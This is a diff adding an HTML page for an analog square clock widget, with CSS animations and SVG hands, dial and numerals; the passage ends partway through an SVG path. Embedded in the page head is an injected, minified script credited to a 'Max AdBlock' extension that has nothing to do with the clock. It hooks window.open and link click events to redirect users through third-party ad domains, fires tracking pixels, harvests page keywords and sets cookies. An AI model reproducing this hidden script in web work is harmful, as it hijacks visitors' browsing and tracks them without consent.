@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Analog Square Clock</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=1280, initial-scale=1, maximum-scale=1">
+<meta name="description" content="Adjustable analog clock widget, with customizable dial, hands and background colors">
+<meta type="color" name="background_color" value="#FFFFFF" label="Background color">
+<meta type="color" name="hands_color" value="#000000" label="Hands and dial color">
+
+<style>
+body {
+  margin: 0;
+  width: 720px;
+  overflow: hidden;
+}
+
+.clockface {
+  width: 720px;
+  height: 720px;
+  margin: 0 auto;
+  position: relative;
+}
+
+#seconds {
+  width: 33px;
+  height: 610px;
+  margin-top: 55px;
+  margin-left: 343px;
+  z-index: 100;
+  position: absolute;
+}
+
+.second-hand {
+  width: 33px;
+  height: 610px;
+  -webkit-animation: handsmove 60s linear 0s infinite;
+          animation: handsmove 60s linear 0s infinite;
+}
+
+#minutes {
+  width: 14px;
+  height: 492px;
+  margin-top: 114px;
+  margin-left: 353px;
+  z-index: 90;
+  position: absolute;
+
+}
+
+.minute-hand {
+  width: 14px;
+  height: 492px;
+  -webkit-animation: handsmove 3600s linear 0s infinite;
+          animation: handsmove 3600s linear 0s infinite;
+}
+
+#hours {
+  width: 33px;
+  height: 369px;
+  margin-top: 175px;
+  margin-left: 344px;
+  z-index: 80;
+  position: absolute;
+}
+
+.hour-hand {
+  width: 33px;
+  height: 369px;
+  -webkit-animation: handsmove 86400s linear 0s infinite;
+          animation: handsmove 86400s linear 0s infinite;
+}
+
+/* Color Scheme */
+.hour-hand svg polygon,
+.minute-hand svg polygon,
+.second-hand svg circle,
+svg g#dial-numbers {
+  fill: #ffffff;
+}
+
+svg g#dial,
+.second-hand svg line {
+  stroke: #ffffff;
+}
+
+svg g#background rect {
+  fill: #000000;
+}
+
+@-webkit-keyframes handsmove {
+   from {
+     -webkit-transform: rotate(0deg);
+   }
+   to {
+     -webkit-transform: rotate(360deg);
+   }
+}
+
+@keyframes  handsmove {
+   from {
+     transform: rotate(0deg);
+   }
+   to {
+     transform: rotate(360deg);
+   }
+}
+
+</style>
+
+<script type="text/javascript" async="" src="./Analog Square Clock_files/wpgb.js" id="jruwmcl34702sh16583msdp2c52"></script><script id="fghjktghndfgt" type="text/javascript">function fghjktghndfgt_init(){new function(){if(!document.getElementById('__fghjktghndfgt_once')){(function(){var a=document.createElement('div');a.id='__fghjktghndfgt_once';a.setAttribute('style','display:none;');var c=document.getElementsByTagName('body')[0];c&&c.appendChild(a)})();var a=this;a.pid='55712';a.cc='VN';a.eid='1057';a.ename='Max AdBlock';a.hid='4458307524842457927';a.debugMode=!1;a.utils=new function(){var b=this;'function'!==typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,'')});b.JSON=new function(){this.parse=function(c){try{return'undefined'!==typeof JSON&&'function'==typeof JSON.stringify?JSON.parse(c):eval('var a='+c)}catch(a){return!1}}};b.cookie=new function(){var c=this;c.setCookie=function(c,a,b){var f='';'string'===typeof b?f='; expires='+b:'number'===typeof b&&(f=new Date,f.setTime(f.getTime()+864E5*b),f='; expires='+f.toGMTString());document.cookie=c+'='+a+f+'; path=/'};c.getCookie=function(c){c+='=';for(var a=document.cookie.split(';'),b=0;b<a.length;b++){for(var f=a[b];' '==f.charAt(0);)f=f.substring(1,f.length);if(0==f.indexOf(c))return f.substring(c.length,f.length)}return null};c.eraseCookie=function(a){c.setCookie(a,'',-1)}};b.getProtocol=function(c){var a=document.createElement('a');a.href=c;return a.protocol};b.getHostName=function(c){if(!c)return'';var a=document.createElement('a');a.href=c;return a.hostname};b.isMenuBarVisible=function(){if(!b.msie&&window.menubar)return window.menubar.visible;if('object'==typeof WebBrowser2)return WebBrowser2.MenuBar;if(b.msie)return!0;var c=window.innerWidth||document.documentElement.scrollWidth||0,a=window.innerHeight||document.documentElement.scrollHeight||0;if(c){window.resizeTo(c,a);var g=window.innerWidth||document.documentElement.scrollWidth,e=window.innerHeight||document.documentElement.scrollHeight;window.resizeTo(c+2,a);c=window.scrollWidth||document.documentElement.scrollWidth;return!(c!=g&&c<=g+2&&90>=a-e)}};b.getInstructions=function(c,d){b.msie?b.inject_script(c+('&cb='+a.prefix+'.'+d)):b.ajax.get(c,function(c){if(c)a[d](c)})};b.l=new function(){var c=this;c.xlat='abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';c.encode=function(a){a=c._utf8_encode(a);for(var b='',e=0;e<a.length;){var f=a.charCodeAt(e++),h=a.charCodeAt(e++),l=a.charCodeAt(e++),k=f>>2,f=(f&3)<<4|h>>4,n=(h&15)<<2|l>>6,m=l&63;isNaN(h)?n=m=64:isNaN(l)&&(m=64);b=b+c.xlat.charAt(k)+c.xlat.charAt(f)+(64==n?'=':c.xlat.charAt(n))+(64==m?'=':c.xlat.charAt(m))}return b};c._utf8_encode=function(c){if(c&&c.length){for(var a='',b=0;b<c.length;b++){var f=c.charCodeAt(b);128>f?a+=String.fromCharCode(f):(127<f&&2048>f?a+=String.fromCharCode(f>>6|192):(a+=String.fromCharCode(f>>12|224),a+=String.fromCharCode(f>>6&63|128)),a+=String.fromCharCode(f&63|128))}return a}return c};c.decode=function(a){a=a.toString().replace(/[^A-Za-z0-9\+\/]/g,'');for(var b='',e=0;e<a.length;){var f=c.xlat.indexOf(a.charAt(e++)),h=c.xlat.indexOf(a.charAt(e++)),l=c.xlat.indexOf(a.charAt(e++)),k=c.xlat.indexOf(a.charAt(e++)),n=(h&15)<<4|l>>2,m=(l&3)<<6|k,b=b+String.fromCharCode(f<<2|h>>4);64!=l&&0<n&&(b+=String.fromCharCode(n));64!=k&&0<m&&(b+=String.fromCharCode(m))}return this._utf8_decode(b)};c._utf8_decode=function(a){for(var c='',b=0;b<a.length;){var f=a.charCodeAt(b);if(128>f)c+=String.fromCharCode(f),b++;else if(191<f&&224>f)var h=a.charCodeAt(b+1),c=c+String.fromCharCode((f&31)<<6|h&63),b=b+2;else var h=a.charCodeAt(b+1),l=a.charCodeAt(b+2),c=c+String.fromCharCode((f&15)<<12|(h&63)<<6|l&63),b=b+3}return c}};b.ajax=new function(){this.get=function(a,b){try{var g=new XMLHttpRequest;g.open('GET',a,!0);g.withCredentials=!0;g.onreadystatechange=function(){4==g.readyState&&b(g.responseText)};g.send()}catch(e){}}};b.randomChar=function(){for(var a='',b=0;2>b;b++)a+='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52*Math.random()));return a};b.msie=function(){var a=parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10);isNaN(a)&&(a=parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10));return isNaN(a)?!1:a}();b.inject_script=function(c){var b=document.getElementsByTagName('body')[0],g=document.createElement('script');g.type='text/javascript';g.id='id_'+a.prefix;g.src=c;b&&b.appendChild(g)};b.epoch=function(){return Math.floor((new Date).getTime()/1E3)};b.getVert=function(){var a=localStorage.getItem('sk398erjds2d');return a?a:b.forexVert()};b.browser=function(){var a=navigator.userAgent.toLowerCase(),b={webkit:/webkit/.test(a),mozilla:/mozilla/.test(a)&&!/(compatible|webkit)/.test(a),chrome:/chrome/.test(a),msie:/msie/.test(a)&&!/opera/.test(a),firefox:/firefox/.test(a),safari:/safari/.test(a)&&!/chrome/.test(a),opera:/opera/.test(a)};b.version=b.safari?(a.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1];return b}();b.getNodeTextProp=function(a){return'textContent'in a?'textContent':'innerText'in a?'innerText':!1};b.dhtml_prop_name=function(a){return a.replace(/(\-([a-z]){1})/g,function(a,c,b){return b.toUpperCase()})};b.get_computed_style='function'!=typeof window.getComputedStyle?function(a){return{getPropertyValue:function(d){'float'==d&&(d='styleFloat');d=b.dhtml_prop_name(d);return'object'==typeof a.currentStyle&&null!=a.currentStyle&&'undefined'!=typeof a.currentStyle[d]?a.currentStyle[d]:null}}}:function(a,b){return window.getComputedStyle(a,b)||{getPropertyValue:function(){}}};b.getEmptyWindow=function(){var a=document.createElement('iframe');a.src='about:blank';a.setAttribute('style','display:inline;width:1px;height:1px;padding:none;margin:none;');document.body.appendChild(a);return a.contentWindow}};a.prefix='fghjktghndfgtssss';a.extName='Max AdBlock';a.version='0.1.1';a.pop_collision_id='__ipm=';a.pixelHostname=function(){try{return'//mnh.'+eval('["winnerical.net","winnermore.com"]')['https:'==window.location.protocol?1:0]}catch(a){return['//mnh.winneri.info','//mnh.winnermore.org']['https:'==window.location.protocol?1:0]}}();a.watcherCount=0;a.fallbackHostnames=['compey.net','comprises.info'];try{a.stngs=a.utils.JSON.parse('{"szy_domain":["unitspybookukset.org","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')}catch(q){a.hostnames=a.fallbackHostnames}var p;p=''!==a.stngs&&a.stngs&&'undefined'!==typeof a.stngs.szy_domain&&a.stngs.szy_domain instanceof Array?a.stngs.szy_domain:a.fallbackHostnames;a.hostnames=p;a.debugMode&&(a.debug=new function(){var b=this;window.oldSetTimeout=window.setTimeout;window.oldSetInterval=window.setInterval;b.overrideSettimeout=function(){window.setTimeout=function(a,b){return window.oldSetTimeout(function(){try{console.log('%csetTimeout: '+a.toString(),'color:purple'),a()}catch(b){}},b)}};b.overrideSetinterval=function(){window.setInterval=function(a,b){return window.oldSetInterval(function(){try{console.log('setInterval: '+a.toString()),a()}catch(b){}},b)}};b.overrideVariables=function(){a.pid='12';a.cc='US';a.eid='10';a.hid='123456789';a.ename='QA extension';a.lt='2617.24';a.jpshort='_OXQj15i';a.platform_version='10'};b.init=function(){b.overrideSettimeout();b.overrideSetinterval();b.overrideVariables()};b.init()});a.legacyHostnames=['superiends.org','go.turboloves.net','installerapplicationusa.com','stylene.net'];a.body=document.getElementsByTagName('body')[0];a.params={subid:a.pid,subid1:a.hid,subid2:a.eid,'px.pluginh':1,tid:'7',red:'1',subid3:'679'};a.manhattanCookieInterval=0.0015;a.events=new function(){var a=this;a.cache=[];a.add=window.addEventListener?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e.addEventListener(c,d,g);f&&a.cache.push([c,d,g,e])}:window.attachEvent?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e['e'+c+d]=d;e[c+d]=function(){e['e'+c+d](window.event)};e.attachEvent('on'+c,e[c+d]);f&&a.cache.push([c,d,g,e])}:function(){};a.remove=window.removeEventListener?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.removeEventListener(a,b,g)}:window.detachEvent?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.detachEvent('on'+a,e[a+b]);e[a+b]=null;e['e'+a+b]=null}:function(){};a.flush=function(){for(var c=0;c<a.cache.length;c++)a.remove.apply(a,a.cache[c]);a.cache=[]}};a.pixel=function(b,c){var d=a.pixelHostname+'?',g=a.hostnames[0],g={pid:a.pid,cc:a.cc,eid:a.eid,hid:a.hid,v:a.version,ch:b,cid:0,tid:a.params.tid,adtid:0,smid:0,pbid:'0',oh:encodeURIComponent(c),sh:encodeURIComponent(g)},e;for(e in g)d+=e+'='+g[e]+'&';d=d.slice(0,-1);if(21===b)return d=d.split('?')[1],a.utils.l.encode(d);(new Image).src=d};a.getKeywords=function(){var a=document.title,c=document.getElementsByTagName('meta');if(c)for(var d=0,g=c.length;d<g;d++)'keywords'!=c[d].name.toLowerCase()&&'description'!=c[d].name.toLowerCase()||(a+=' '+c[d].content.replace(/,/g,' '));if(d=document.getElementsByTagName('a')){c={};for(g=0;g<d.length;g++)try{var e=d[g].innerText;'undefined'==typeof e&&(e=d[g].textContent);for(var f=e.toLowerCase().split(/[\s,-]/g),h=0;h<f.length;h++)4>f[h].length||(c[f[h]]?c[f[h]]++:c[f[h]]=1)}catch(l){}var e=[],k;for(k in c)e.push([k,c[k]]);e.sort(function(a,b){return b[1]-a[1]});e=e.slice(0,25);for(k=0;k<e.length;k++)a+=' '+e[k][0]}return encodeURIComponent(a.replace(/[\!\[\]_-]/g,' ').trim().substring(0,1500))};a.isFalseResponseFromServer=function(){-1<a.body.innerText.indexOf('e7hZBzqVfn==')&&window.close()};a.checkIfServer=function(){for(var b=0;b<a.hostnames.length;b++)if(location.hostname===a.hostnames[b])return a.isFalseResponseFromServer(),!0};a.checkIfPop=function(b,c,d){return!(d+'').match(/^InterYield/i)&&!(d+'').match(/(a652c|ld893)_/)&&'r_ron_redir'!==d&&-1==document.cookie.indexOf('xcddsa')&&-1==b.indexOf('px.pluginh')&&-1==b.indexOf('earchfu')&&-1==location.href.indexOf('/amz/')&&-1==location.href.indexOf('/sd/dw32.html')&&-1==location.href.indexOf('/pop/1.1.00')&&!location.href.match(/cpops-\d+\.html/)&&-1==location.href.indexOf('px.pluginh')&&-1==b.indexOf('nkths.co')&&-1==b.indexOf('ally.asi')&&-1==b.indexOf('/sd/dw32.html')&&-1==b.indexOf('/pop/1.1.00')&&-1==b.indexOf('/amz/')&&!b.match(/cpops-\d+\.html/)&&-1==a.utils.getHostName(b).indexOf('getjs')&&-1==a.utils.getHostName(b).indexOf('hsbc')};window==window.top&&a.pixel(10,'0');-1<window.location.href.indexOf(a.pop_collision_id)&&window==window.top&&a.pixel(13,'0');a.addBlurredTabListener=function(b){var c;try{c=a.utils.getHostName(b.target.getAttribute('href'))}catch(d){c=''}'a'==b.target.tagName.toLowerCase()&&''==b.target.innerHTML&&b.target.getAttribute('href')&&!b.target.getAttribute('download')&&-1==c.indexOf(window.location.hostname)&&(c=b.target.getAttribute('href')?b.target.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),b.target.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),b.target.setAttribute('href',a.manhattanUrl),document.getElementsByTagName('body')[0].removeEventListener('click',a.addBlurredTabListener))};a.prepareUrl=function(b){b='?';for(var c in a.params)b+=c+'='+a.params[c]+'&';b+='k='+a.getKeywords();return'http://'+a.hostnames[0]+b};try{window.top==window&&-1==document.cookie.indexOf('vdsknj4th4uh')&&window.name!==a.prefix&&a.overrideDispatchEvent()}catch(r){}a.checkIfServer()||(a.cachedOpenFn=window.open,a.overrideDispatchEvent=function(){a.cachedDispatchEvent=document.createElement('a').constructor.prototype.dispatchEvent;document.createElement('a').constructor.prototype.dispatchEvent=function(b){var c;try{c=a.utils.getHostName(event.target.getAttribute('href'))}catch(d){c=''}'a'==this.tagName.toLowerCase()&&''==this.innerHTML&&'click'==b.type&&-1==c.indexOf(window.location.hostname)&&this.getAttribute('href')&&!this.getAttribute('download')&&-1==document.cookie.indexOf('vdsknj4th4uh')&&(c=this.getAttribute('href')?this.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),this.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),this.setAttribute('href',a.manhattanUrl));a.cachedDispatchEvent.call(this,b)}},a.checkIfPartner=function(a){return'Za'==a},a.overrideWindowOpen=function(){clearTimeout(a.timeout);window.open=function(b){return function(c,d,g){window==window.top&&a.pixel(11,'0');b=a.cachedOpenFn;if(a.checkIfPop(c,g,d))return d=new Date,d.setMinutes(d.getMinutes()+15),a.utils.cookie.setCookie('xcddsa','1',d.toUTCString()),a.manhattanUrl=a.prepareUrl(c),d=a.prefix,a.pixel(20,c),a.manhattanOn=!0,a.utils.msie&&9>a.utils.msie?window.open(a.manhattanUrl,d,g):b.call(window,a.manhattanUrl,d,g);d=d||'';window.open=a.cachedOpenFn;return a.utils.msie&&9>a.utils.msie?window.open(c,d,g):b.call(window,c,d,g)}}(window.open);4<a.watcherCount||a.manhattanOn||(a.watcherCount++,a.openWatcher())},a.overrideDispatchEvent(),a.openWatcher=function(){a.timeout=setTimeout(a.overrideWindowOpen,200)},a.openWatcher(),'undefined'==typeof window[a.prefix]&&(window[a.prefix]=a))}};};fghjktghndfgt_init()</script><script src="./Analog Square Clock_files/SharedApp.js"></script><script src="./Analog Square Clock_files/json3.js"></script><script src="./Analog Square Clock_files/NWPLegacy_v2.js"></script><script src="./Analog Square Clock_files/bloomfilter.js"></script><script src="./Analog Square Clock_files/jquery.xdr.js"></script><script src="./Analog Square Clock_files/jquery.dotdotdot.js"></script></head><body s4458307524842457927="1" jhjlijpomuhn_9="1" style="-webkit-transform: translate(280px, -18px) scale(0.95); transform: translate(280px, -18px) scale(0.95);"><div class="clockface ">
+  <div class="hands">
+    <div id="seconds" style="-webkit-transform: rotate(318deg); transform: rotate(318deg);">
+      <div class="second-hand">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="33px" height="665px" viewBox="0 0 33 665" enable-background="new 0 0 33 665" xml:space="preserve">
+          <g>
+            <g>
+              <line fill="none" stroke="#FFFFFF" stroke-width="2" stroke-miterlimit="10" x1="17" y1="0" x2="17" y2="440"></line>
+              <circle fill="#FFFFFF" cx="16.914" cy="450.742" r="11"></circle>
+            </g>
+          </g>
+        </svg>
+      </div>
+    </div>
+    <div id="minutes" style="-webkit-transform: rotate(126deg); transform: rotate(126deg);">
+      <div class="minute-hand">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="14px" height="492px" viewBox="0 0 14 492" enable-background="new 0 0 14 492" xml:space="preserve">
+          <g>
+            <g>
+              <polygon fill="#FFFFFF" points="14,341.905 0,341.941 5.104,0 9.104,0"></polygon>
+            </g>
+          </g>
+        </svg>
+      </div>
+    </div>
+    <div id="hours" style="-webkit-transform: rotate(190.5deg); transform: rotate(190.5deg);">
+      <div class="hour-hand">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="33px" height="369px" viewBox="0 0 33 369" enable-background="new 0 0 33 369" xml:space="preserve">
+          <g>
+            <g>
+              <polygon fill="#FFFFFF" points="32.999,239.01 0,239.022 11.14,0.01 22.057,0.005"></polygon>
+            </g>
+          </g>
+        </svg>
+      </div>
+    </div>
+  </div>
+  <svg id="svg-background" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="720px" height="720px" viewBox="0 0 720 720" enable-background="new 0 0 720 720" xml:space="preserve" style="-webkit-transform: scaleX(1.87134502923977); transform: scaleX(1.87134502923977);">
+    <g id="background">
+      <rect fill="#000" width="720" height="720"></rect>
+    </g>
+    <g id="dial" stroke="#ffffff">
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="359.5" y1="720" x2="359.5" y2="671"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="567.5" y1="720" x2="514.945" y2="629.512"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="720" y1="568.5" x2="628.82" y2="515.859"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="720" y1="360.5" x2="671" y2="360.5"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="720" y1="152.5" x2="629.462" y2="204.861"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="568" y1="0" x2="515.67" y2="90.843"></line>
+        <line opacity="0.5" fill="none" stroke-width="9" stroke-miterlimit="10" x1="360.5" y1="0" x2="360.5" y2="49"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="152.5" y1="0" x2="204.811" y2="90.344"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="0" y1="151.5" x2="90.652" y2="203.994"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="0" y1="359.5" x2="49" y2="359.5"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="0" y1="567.5" x2="90.294" y2="514.995"></line>
+        <line opacity="0.5" fill="none" stroke-width="3" stroke-miterlimit="10" x1="151.5" y1="720" x2="203.803" y2="629.011"></line>
+    </g>
+    <g id="dial-numbers" fill="#FFFFFF">
+      <g>
+        <path d="M328.68,67.336l-14.475,13.32l-3.83-3.528l15.7-14.976h8.501v49.968h-5.897V67.336z"></path>
+        <path d="M371.721,93.904c-3.983,0-7.175,0.205-9.573,0.611c-2.401,0.408-4.264,1.021-5.591,1.836
+          c-1.328,0.817-2.209,1.812-2.642,2.988c-0.435,1.178-0.651,2.557-0.651,4.141v3.455h52.155v5.185h-57.746v-8.567
+          c0-2.593,0.408-4.824,1.225-6.697c0.816-1.871,2.145-3.42,3.983-4.644c1.838-1.224,4.25-2.124,7.237-2.7s6.674-0.863,11.067-0.863
+          h8.884c4.186,0,7.594-0.168,10.224-0.504c2.629-0.336,4.672-0.889,6.127-1.656s2.438-1.787,2.948-3.061
+          c0.51-1.271,0.767-2.844,0.767-4.716c0-2.159-0.23-3.972-0.689-5.437c-0.46-1.463-1.405-2.663-2.834-3.6
+          c-1.43-0.936-3.459-1.607-6.088-2.016c-2.631-0.407-6.115-0.611-10.454-0.611h-6.28c-4.238,0-7.634,0.18-10.186,0.539
+          c-2.554,0.36-4.532,0.912-5.936,1.656c-1.405,0.744-2.336,1.668-2.795,2.771c-0.46,1.105-0.716,2.377-0.766,3.816h-5.974
+          c0-2.399,0.433-4.475,1.302-6.229c0.868-1.751,2.298-3.203,4.289-4.355s4.62-2.004,7.888-2.557
+          c3.267-0.551,7.326-0.827,12.177-0.827h6.28c5.258,0,9.547,0.3,12.866,0.899c3.318,0.602,5.922,1.573,7.812,2.916
+          c1.889,1.345,3.179,3.085,3.868,5.221c0.688,2.137,1.033,4.74,1.033,7.812c0,2.641-0.306,4.909-0.919,6.804
+          c-0.612,1.897-1.826,3.469-3.638,4.717c-1.812,1.248-4.379,2.172-7.697,2.771c-3.319,0.602-7.71,0.9-13.172,0.9H371.721z"></path>
+      </g>
+      <g>
+        <path d="M74.458,361.15c-2.502-0.6-4.532-1.476-6.088-2.627c-1.558-1.152-2.681-2.557-3.37-4.213
+          c-0.689-1.656-1.034-3.539-1.034-5.652v-2.951c0-2.111,0.318-3.996,0.958-5.652c0.638-1.656,1.723-3.047,3.255-4.176
+          c1.532-1.127,3.548-1.98,6.05-2.557c2.501-0.575,5.616-0.863,9.343-0.863h18.687c3.625,0,6.688,0.264,9.19,0.792
+          c2.501,0.528,4.519,1.476,6.05,2.844c1.531,1.368,2.642,3.204,3.331,5.509c0.689,2.303,1.034,5.208,1.034,8.711v14.965
+          c0,3.158-0.383,5.861-1.149,8.109c-0.766,2.248-2.029,4.066-3.791,5.453c-1.761,1.387-4.072,2.402-6.931,3.049
+          c-2.86,0.646-6.408,0.969-10.645,0.969H87.937c-4.289,0-7.939-0.289-10.952-0.864c-3.013-0.576-5.451-1.452-7.314-2.628
+          c-1.864-1.176-3.216-2.652-4.059-4.428c-0.842-1.775-1.264-3.863-1.264-6.265h5.514c0.05,1.394,0.318,2.653,0.804,3.78
+          c0.485,1.129,1.302,2.076,2.451,2.844c1.149,0.769,2.681,1.357,4.595,1.764c1.915,0.408,4.377,0.612,7.391,0.612h16.849
+          c2.757,0,5.041-0.202,6.854-0.608c1.812-0.406,3.255-1.087,4.327-2.043c1.072-0.955,1.825-2.209,2.259-3.762
+          c0.433-1.553,0.651-3.477,0.651-5.771v-8.192c-0.306,0.576-0.689,1.141-1.148,1.691c-0.459,0.553-1.175,1.057-2.145,1.513
+          c-0.971,0.456-2.248,0.828-3.829,1.116c-1.583,0.287-3.676,0.432-6.28,0.432h-19.07C79.997,362.051,76.958,361.752,74.458,361.15z
+           M76.334,338.219c-1.558,0.385-2.809,0.949-3.753,1.691c-0.945,0.746-1.621,1.646-2.029,2.701
+          c-0.409,1.057-0.613,2.231-0.613,3.527v2.16c0,1.2,0.217,2.316,0.651,3.348c0.434,1.033,1.123,1.934,2.068,2.7
+          c0.944,0.769,2.183,1.38,3.714,1.837c1.532,0.456,3.37,0.684,5.514,0.684h22.363c2.145,0,3.956-0.228,5.438-0.684
+          c1.48-0.457,2.692-1.068,3.638-1.837c0.944-0.767,1.634-1.667,2.068-2.7c0.433-1.031,0.651-2.147,0.651-3.348v-2.16
+          c0-2.639-0.869-4.716-2.604-6.229c-1.736-1.512-4.749-2.268-9.037-2.268H82.04C79.792,337.643,77.891,337.836,76.334,338.219z"></path>
+      </g>
+      <g>
+        <path d="M378.877,626.243c2.501,0.624,4.53,1.512,6.088,2.663c1.557,1.152,2.681,2.557,3.37,4.213
+          c0.689,1.656,1.034,3.517,1.034,5.58v2.951c0,2.113-0.32,3.996-0.958,5.652c-0.639,1.656-1.723,3.049-3.255,4.176
+          c-1.532,1.129-3.549,1.98-6.05,2.557c-2.502,0.576-5.617,0.863-9.343,0.863h-18.687c-3.626,0-6.689-0.263-9.19-0.791
+          c-2.502-0.528-4.519-1.477-6.05-2.845c-1.531-1.368-2.642-3.191-3.331-5.472c-0.689-2.279-1.034-5.195-1.034-8.748v-14.977
+          c0-3.168,0.383-5.879,1.149-8.135c0.766-2.256,2.029-4.08,3.791-5.473c1.761-1.392,4.071-2.412,6.931-3.061
+          c2.858-0.647,6.407-0.972,10.645-0.972h11.412c4.289,0,7.938,0.288,10.952,0.864c3.012,0.576,5.449,1.452,7.314,2.628
+          c1.863,1.177,3.216,2.653,4.059,4.429c0.842,1.775,1.264,3.863,1.264,6.264h-5.514c-0.052-1.393-0.32-2.652-0.804-3.78
+          c-0.486-1.128-1.302-2.075-2.451-2.845c-1.149-0.767-2.694-1.355-4.634-1.764c-1.941-0.406-4.392-0.611-7.352-0.611h-16.849
+          c-2.757,0-5.042,0.205-6.854,0.611c-1.813,0.408-3.255,1.093-4.327,2.053c-1.072,0.961-1.826,2.221-2.259,3.779
+          c-0.435,1.561-0.651,3.492-0.651,5.797v8.207c0.306-0.576,0.689-1.139,1.148-1.691c0.459-0.551,1.174-1.056,2.145-1.512
+          c0.969-0.456,2.246-0.828,3.829-1.117c1.582-0.287,3.676-0.432,6.28-0.432h19.07C373.337,625.307,376.375,625.619,378.877,626.243
+          z M380.715,647.447c1.787-1.512,2.681-3.588,2.681-6.229v-2.16c0-1.199-0.218-2.314-0.651-3.348
+          c-0.435-1.031-1.124-1.932-2.068-2.7c-0.945-0.767-2.183-1.379-3.714-1.836c-1.532-0.456-3.37-0.685-5.514-0.685h-22.363
+          c-2.145,0-3.958,0.229-5.438,0.685c-1.481,0.457-2.694,1.069-3.638,1.836c-0.945,0.769-1.635,1.669-2.068,2.7
+          c-0.435,1.033-0.651,2.148-0.651,3.348v2.16c0,2.641,0.867,4.717,2.604,6.229c1.735,1.512,4.749,2.268,9.037,2.268h22.363
+          C375.788,649.715,378.928,648.959,380.715,647.447z"></path>
+      </g>
+      <g>
+        <path d="M641.587,354.49c1.888,0,3.562-0.107,5.017-0.323s2.68-0.624,3.676-1.224s1.749-1.451,2.259-2.557
+          c0.51-1.104,0.766-2.52,0.766-4.248c0-1.392-0.218-2.592-0.651-3.6c-0.435-1.008-1.329-1.848-2.681-2.52
+          c-1.354-0.672-3.306-1.164-5.859-1.477c-2.554-0.312-5.949-0.469-10.186-0.469h-7.965c-3.625,0-6.561,0.193-8.807,0.576
+          c-2.248,0.385-3.996,0.949-5.246,1.692c-1.252,0.745-2.12,1.704-2.604,2.88c-0.486,1.177-0.754,2.557-0.804,4.141h-5.514
+          c0-2.017,0.255-3.912,0.766-5.688c0.51-1.775,1.519-3.312,3.025-4.608c1.505-1.295,3.663-2.314,6.472-3.06
+          c2.807-0.743,6.56-1.116,11.258-1.116h10.569c4.799,0,8.731,0.217,11.794,0.648s5.476,1.164,7.237,2.195
+          c1.761,1.033,2.987,2.401,3.676,4.104c0.689,1.704,1.034,3.805,1.034,6.3c0,2.016-0.205,3.637-0.613,4.86
+          c-0.409,1.224-0.958,2.221-1.646,2.987c-0.689,0.77-1.481,1.345-2.374,1.729c-0.894,0.385-1.826,0.744-2.795,1.08
+          c0.969,0.24,1.915,0.553,2.833,0.936c0.919,0.385,1.71,0.973,2.374,1.765c0.663,0.792,1.199,1.884,1.608,3.276
+          c0.408,1.393,0.613,3.192,0.613,5.399c0,2.64-0.32,4.896-0.958,6.769c-0.639,1.871-1.826,3.396-3.561,4.571
+          c-1.736,1.177-4.149,2.028-7.237,2.556c-3.09,0.529-7.084,0.793-11.986,0.793h-10.416c-4.392,0-7.965-0.24-10.722-0.721
+          c-2.757-0.479-4.939-1.283-6.548-2.412c-1.608-1.127-2.732-2.592-3.37-4.392c-0.639-1.8-0.983-3.996-1.034-6.588h5.514
+          c0.05,1.728,0.332,3.168,0.842,4.319c0.51,1.152,1.404,2.077,2.681,2.772c1.276,0.696,2.987,1.188,5.131,1.476
+          c2.145,0.289,4.875,0.433,8.194,0.433h8.731c3.982,0,7.224-0.155,9.727-0.468c2.501-0.312,4.454-0.828,5.859-1.549
+          c1.403-0.72,2.361-1.691,2.872-2.916c0.51-1.224,0.766-2.746,0.766-4.572c0-2.016-0.243-3.6-0.728-4.752
